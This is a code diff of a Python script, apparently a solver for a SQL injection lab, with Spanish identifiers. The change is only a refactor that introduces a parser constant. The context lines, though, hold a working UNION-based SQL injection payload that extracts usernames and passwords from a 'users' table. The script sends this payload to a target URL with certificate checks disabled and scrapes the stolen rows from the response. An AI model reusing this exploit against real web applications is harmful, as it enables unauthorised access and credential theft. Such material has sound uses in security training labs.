@@ -8,7 +8,7 @@ from bs4 import BeautifulSoup
 urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 def exploit_tabla_usuarios(url, ruta):
-    objetivo = 'administrator'
+    HTML_PARSER = 'html.parser'
     payload = "' UNION SELECT username, password FROM users--"
     ruta_normal = url + ruta[1:]
     ruta_a_atacar = url + ruta[1:] + payload
@@ -21,11 +21,11 @@ def exploit_tabla_usuarios(url, ruta):
 
     peticion_normal = requests.get(ruta_normal, verify=False)
     html = peticion_normal.text
-    lista_tr_html = BeautifulSoup(html,'html.parser').findAll('tr')
+    lista_tr_html = BeautifulSoup(html,HTML_PARSER).findAll('tr')
 
     peticion_exploit = requests.get(ruta_a_atacar, verify=False)
     html_exploited = peticion_exploit.text
-    lista_tr_html_exploited = BeautifulSoup(html_exploited,'html.parser').findAll('tr')
+    lista_tr_html_exploited = BeautifulSoup(html_exploited,HTML_PARSER).findAll('tr')
         
     lista_tr_diferentes = []
     for tr in lista_tr_html_exploited:
@@ -45,7 +45,7 @@ def exploit_tabla_usuarios(url, ruta):
 def obtener_enlace_ataque(url):
     peticion = requests.get(url)
     html = peticion.text
-    soup = BeautifulSoup(html,'html.parser')
+    soup = BeautifulSoup(html,HTML_PARSER)
     section = soup.findAll('section')
     section_filtros = section[len(section)-1]
     enlaces = section_filtros.findAll('a')
